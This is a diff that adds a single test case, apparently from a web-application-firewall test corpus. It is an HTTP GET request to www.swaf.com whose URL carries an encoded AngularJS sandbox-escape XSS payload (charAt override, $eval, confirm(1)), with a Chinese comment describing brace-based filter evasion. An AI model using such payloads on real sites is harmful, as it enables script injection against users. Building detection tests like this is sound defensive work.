@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_常规_框架_AngularJS-06506755
+# 通过多个连续的闭合大括号 } 来绕过可能存在的字符过滤和限制
+GET /?id=%7B%7B%27a%27.constructor.prototype.charAt=%5B%5D.join%3B$eval%28%27x=1%7D%20%7D%20%7D%3Bconfirm%281%29%2F%2F%27%29%3B%7D%7D&bid=hd_tag_m8mv25dq HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25dq
+RM-PRO-Token: 3578a64e4815ca3c53da35c3f72b5f6e
+RM-PRO-Time: 1742808462216
+User-Agent: curl/7.83.1
+
